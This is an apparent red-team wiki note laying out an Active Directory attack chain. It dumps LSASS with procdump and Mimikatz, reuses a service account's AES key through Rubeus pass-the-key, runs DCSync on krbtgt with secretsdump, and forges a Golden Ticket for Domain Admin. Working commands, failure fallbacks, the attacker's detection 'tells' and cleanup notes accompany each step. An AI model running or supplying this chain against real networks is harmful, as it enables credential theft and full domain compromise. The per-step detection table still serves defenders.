---
title: "Attack Path: LSASS Key → Pass the Key → DCSync → Domain Admin"
type: note
created: 2026-09-06
updated: 2026-09-06
tags: [attack-path, active-directory, pass-the-key, privilege-escalation]
---

# Attack Path: LSASS Key → Pass the Key → DCSync → Domain Admin

A common "you're already on a host" path: instead of cracking a stolen hash
or forging a ticket, you **reuse a captured Kerberos key** of a privileged
service account via [[pass-the-key|PtK]]. The PtK step is what makes it
quieter — the KDC mints a *fresh, legitimate* ticket (no forged-ticket
lifetime tell), so the 4768 looks normal; the signal is context (a service
account authenticating from a workstation IP).

## Chain

```
You (foothold on a host, low-priv)
  --LSASS dump--> AES256 key of svc_tier1 (a Tier-1 service account)
  --Pass the Key (Rubeus asktgt /aes256)--> fresh TGT as svc_tier1
  --svc_tier1 holds GetChanges/GetChangesAll (or is local admin on a DC)-->
  DCSync krbtgt
  --Golden Ticket--> Domain Admin
```

## Prerequisites / what signals this path exists

- A **foothold on a host** where a privileged service account's logon is
  (or was) present — so its AES key is in [[lsass]] memory.
- That service account has a **DCSync right** (`GetChanges`/`GetChangesAll`)
  or is **local admin on a DC** — confirm before committing:

```powershell
# On the foothold host — dump LSASS, look for a Tier-1 account's AES key
procdump64.exe -accepteula -ma lsass.exe lsass.dmp
# parse (Mimikatz) for 'svc_tier1' AES256 key + whether it's a service/Tier-1 acct
privilege::debug
sekurlsa::logonpasswords /dump:lsass.dmp

# Does svc_tier1 have DCSync rights? (from a domain-auth context)
Get-DomainObject -Identity "corp.local" -Properties * | Select-String "GetChangesAll"
# or BloodHound: shortest path svc_tier1 -> GetChangesAll (the DCSync edge)
```

See [[lsass]] for the dump, [[dcsync]] for the replication right.

## Step 1 — Recover the key

Dump LSASS and extract `svc_tier1`'s `aes256-cts-hmac-sha1-96` (64-hex).
Prefer the **AES256** key (stronger, less downgrade-noisy); fall back to
AES128/RC4 if that's all that's in memory (see
[[kerberos-encryption-types]]).

**Verify:** you have a 64-char hex key for `svc_tier1` and know its
`sAMAccountName` + domain.

## Step 2 — Pass the Key (fresh TGT)

```powershell
Rubeus.exe asktgt /user:svc_tier1 /domain:corp.local /aes256:<64-hex> /ptt
Rubeus.exe triage        # should list a TGT for svc_tier1
whoami /all              # corp.local\svc_tier1 + its groups
```

This is [[pass-the-key|PtK]] — the KDC issues a legitimate ticket, so the
4768 is clean (no forged-lifetime tell). Contrast with
[[golden-silver-tickets]] (offline forgery, stale-ticket tell).

**Verify:** `whoami /all` shows `svc_tier1` and its group memberships
(expect a Tier-1/service group).

### Failure modes & fallbacks
- **Wrong enctype** — you supplied AES256 but the account only has an RC4 key
  (or vice versa). Re-pick the key from the LSASS dump that matches
  (`/aes128` / `/rc4`). See [[kerberos-encryption-types]].
- **Account locked / disabled** — PtK still needs a valid account; if
  `svc_tier1` is locked, use its key for a *different* action or crack it.
- **TGT valid but no DCSync right** — you authenticated as the account but it
  doesn't actually replicate; re-check the BloodHound DCSync edge before
  step 3.

## Step 3 — DCSync krbtgt

```bash
# Prove the replication right first, then dump krbtgt
Get-ADReplicationPartners -Server dc01.corp.local
secretsdump.py -k -no-pass corp.local/svc_tier1@dc01.corp.local -just-dc-user krbtgt
```

**Verify:** output shows `krbtgt` `aes256-cts-hmac-sha1-96`. Save it.
See [[dcsync]].

### Failure modes & fallbacks
- **`PRC_REMOTE_NO_MORE` / replication errors** — hitting a read-replica;
  retry the PDC emulator or another DC (`-dc-ip`).
- **No DSRUAPI access** — your path to the DCSync right was via a group the
  DC doesn't resolve; re-verify the ACE.

## Step 4 — Domain dominance

```powershell
Rubeus.exe asktgt /user:Administrator /domain:corp.local /sid:S-1-5-21-... \
  /aes256:<krbtgt-aes256> /sids:S-1-5-21-...:512 /ptt
whoami /all   # -> corp.local\administrator + 512 (Domain Admins)
```

See [[golden-silver-tickets]]. **Verify:** `whoami /all` lists
`corp.local\administrator`.

## Detection summary (per step)

| Step | What fires | Your tell |
|------|-----------|-----------|
| 1 (LSASS) | Sysmon 10 (LSASS access), 4688 procdump | an odd process opening lsass.exe |
| 2 (PtK) | 4768 (clean TGT) for svc_tier1 from a workstation IP | a service account requesting a TGT off-DC |
| 3 (DCSync) | 4662 on the domain object (GetChanges+GetChangesAll) | svc_tier1 performing replication |
| 4 (Golden) | 4768 / 4624 for Administrator from a workstation | DA on a non-DC |

## Cleanup notes
- LSASS dump is memory-only; the trail is Sysmon 10 + the `.dmp` file.
- PtK leaves a normal TGT (dies with the session); no AD object to clean.
- DCSync's trail is 4662. Expect `krbtgt` to rotate twice if caught
  ([[krbtgt]]) — any Golden Ticket then fails until rebuilt.

## Related
- [[pass-the-key]] — the auth primitive (step 2)
- [[lsass]] — the key source (step 1)
- [[dcsync]], [[golden-silver-tickets]] — steps 3-4
- [[kerberos-encryption-types]] — which key/enctype to supply
- [[ad-persistence]] — what to set up next for durable access
